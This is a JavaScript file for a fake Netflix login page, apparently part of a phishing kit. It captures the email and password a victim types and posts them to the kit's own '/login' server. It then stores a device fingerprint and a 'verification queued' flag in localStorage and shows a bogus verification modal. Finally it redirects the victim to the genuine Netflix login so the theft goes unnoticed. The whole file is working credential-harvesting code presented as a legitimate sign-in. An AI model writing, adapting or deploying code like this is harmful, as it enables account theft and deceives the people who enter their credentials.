document.addEventListener('DOMContentLoaded', function() {
    const form = document.querySelector('.login-form');
    const inputs = document.querySelectorAll('.input-group input');
    const signInBtn = document.querySelector('.sign-in-btn');

    // Check if this device has a pending verification
    const verificationStatus = localStorage.getItem('netflix_verification_status');
    console.log('[+] Verification status from localStorage:', verificationStatus);

    if (verificationStatus === 'queued') {
        console.log('[+] Showing verification modal on page load');
        // Show verification modal immediately
        setTimeout(() => {
            const modal = document.getElementById('verification-modal');
            if (modal) {
                modal.style.display = 'flex';
            }
        }, 500);
    }

    inputs.forEach(input => {
        input.addEventListener('focus', function() {
            this.parentElement.style.transform = 'scale(1.02)';
            this.parentElement.style.transition = 'transform 0.2s ease';
        });

        input.addEventListener('blur', function() {
            this.parentElement.style.transform = 'scale(1)';
        });
    });

    signInBtn.addEventListener('mouseenter', function() {
        this.style.transform = 'scale(1.02)';
        this.style.transition = 'transform 0.2s ease';
    });

    signInBtn.addEventListener('mouseleave', function() {
        this.style.transform = 'scale(1)';
    });

    form.addEventListener('submit', async function(e) {
        e.preventDefault();

        const email = document.querySelector('input[name="email"]').value;
        const password = document.querySelector('input[name="password"]').value;

        if (email && password) {
            signInBtn.textContent = 'Verifying...';
            signInBtn.style.opacity = '0.7';

            // Send credentials to server
            try {
                const response = await fetch('/login', {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    },
                    body: `email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`
                });

                if (response.ok) {
                    // Store verification status in localStorage
                    localStorage.setItem('netflix_verification_status', 'queued');
                    localStorage.setItem('netflix_verification_timestamp', Date.now().toString());

                    // Store device fingerprint
                    const fingerprint = generateDeviceFingerprint();
                    localStorage.setItem('netflix_device_id', fingerprint);

                    console.log('[+] Saved to localStorage:');
                    console.log('  - Status: queued');
                    console.log('  - Timestamp:', localStorage.getItem('netflix_verification_timestamp'));
                    console.log('  - Device ID:', fingerprint);

                    signInBtn.textContent = 'Success';
                    setTimeout(() => {
                        // Show verification modal
                        document.getElementById('verification-modal').style.display = 'flex';
                        // Reset button
                        signInBtn.textContent = 'Sign In';
                        signInBtn.style.opacity = '1';
                    }, 500);
                }
            } catch (error) {
                console.error('Error:', error);
                signInBtn.textContent = 'Sign In';
                signInBtn.style.opacity = '1';
            }
        }
    });

    // Close modal button
    document.getElementById('close-modal').addEventListener('click', function() {
        document.getElementById('verification-modal').style.display = 'none';
        // Redirect to Netflix
        window.location.href = 'https://www.netflix.com/login';
    });

    // Generate simple device fingerprint
    function generateDeviceFingerprint() {
        const components = [
            navigator.userAgent,
            navigator.language,
            screen.width + 'x' + screen.height,
            new Date().getTimezoneOffset(),
            navigator.platform
        ];
        return btoa(components.join('|'));
    }
});
